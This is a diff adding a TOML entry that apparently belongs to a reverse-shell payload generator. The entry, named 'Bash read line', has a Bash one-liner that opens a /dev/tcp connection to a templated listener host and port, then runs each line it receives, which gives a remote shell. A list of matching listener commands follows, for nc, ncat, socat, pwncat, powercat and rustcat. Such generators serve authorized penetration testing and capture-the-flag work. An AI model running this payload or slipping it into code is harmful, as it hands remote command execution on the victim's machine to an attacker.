@@ -1,0 +1,22 @@
+id = "bash_read_line"
+name = "Bash read line"
+os = "unix"
+type = "reverse"
+proto = "tcp"
+lang = "bash"
+description = "Uses file descriptor 5 to open a TCP connection to the specified host and port, then read lines from the socket and executes them, redirecting IO through F5 5."
+
+payload = "exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do $line 2>&5 >&5; done"
+
+[listeners]
+nc = "nc -lvnp {{LPORT}}"
+nc_freebsd = "nc -lvn {{LPORT}}"
+busybox_nc = "busybox nc -lp {{LPORT}}"
+ncat = "ncat -lvnp {{LPORT}}"
+ncat_exe = "ncat.exe -lvnp {{LPORT}}"
+rlwrap_nc = "rlwrap -cAr nc -lvnp {{LPORT}}"
+rustcat = "rcat listen {{LPORT}}"
+pwncat = "python3 -m pwncat -lp {{LPORT}}"
+socat = "socat -d -d TCP-LISTEN:{{LPORT}} STDOUT"
+socat_tty = "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{{LPORT}}"
+powercat = "powercat -l -p {{LPORT}}"
